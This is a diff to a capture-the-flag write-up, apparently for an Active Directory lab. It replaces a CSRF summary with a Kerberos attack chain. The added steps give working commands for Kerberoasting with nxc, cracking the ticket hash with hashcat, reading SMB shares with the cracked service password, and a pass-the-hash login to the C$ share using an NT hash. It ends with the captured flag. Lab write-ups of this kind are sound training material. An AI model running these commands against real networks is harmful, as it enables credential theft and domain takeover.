@@ -2,7 +2,7 @@
 
 **OWASP Category:** 
 
-!!!!!!!!!!!!!!!!!!!Through finding and utilizing a CSRF vulnerability I was able to change username of a user registered on the OWASP Juice Shop.!!!!!!!!!!!!!!!!!!!
+Enumerated Kerberos users using Kerbrute tool and through RID brute-forcing we were able to connect to SMB as a valid user. Using Kerberoasting attack, we revealed SPN accounts. Using HashCat we cracked the password to one SPN account and were able to access SMB shares using the SPN account.
 
 ## Tools:
 - **Web Browser**
@@ -12,6 +12,7 @@
 - **kerbrute** (github.com/ropnop/kerbrute)
 - **nxc**
 - **awk**
+- **hashcat**
 
 ## Methodology:
 
@@ -57,11 +58,22 @@
 9. **Kerberoasting**
     - Kerberoasting using nxc: nxc ldap 10.112.156.194 -u ybob317 -p ybob317 --kerberoasting output.txt .
     This command searching via LDAP account that have a set SPN (Service Principal Name), requests for the accounts TGS (Kerberos Service Ticket) and saves the aquired ticket hashes to .txt file.
+    We found 5 SPN accounts, we will further user this one: file_svc. Saved the file_svc ticket hash into file hash.txt.
 
+10. **Cracking the SPN account password**
+    - Trying to decrypt the TGS hash using HashCat: hashcat -m13100 hash.txt /usr/share/wordlists/rockyou.txt . Success! Password is: Password123!! .
 
+11. **Connecting to SMB through SPN account**
+    - nxc smb 10.112.156.194 -u 'file_svc' -p 'Password123!!' --shares . Successfully connected and listed shares - we can now also read the /backup. 
+    - smbclient //10.112.156.194/backup -U file_svc . We found the file backup_extract.txt -> get backup_extract.txt .
+    - We see some NTLM hashes in the file:
 
+    <img src="\assets\Soupdecode01_backup.png" alt="backup" width="1000px">
+
+12. **Pass-the-Hash**
+    - smbclient //10.112.156.194/C$ -U 'FileServer$%e41da7e79a4c76dbd9cf79d1cb325559' --pw-nt-hash
+    - Found the flag in path: Users/Administrator/Desktop/root.txt
+    - get root.txt
+    - cat root.txt -> Flag: 27cb2be302c388d63d27c86bfdd5f56a
 
 ## Remediation
-- **Anti-CSRF Tokens**
-- **Same-Site Cookies**
-- **CORS Policies** - Cross-Origin Resource Sharing
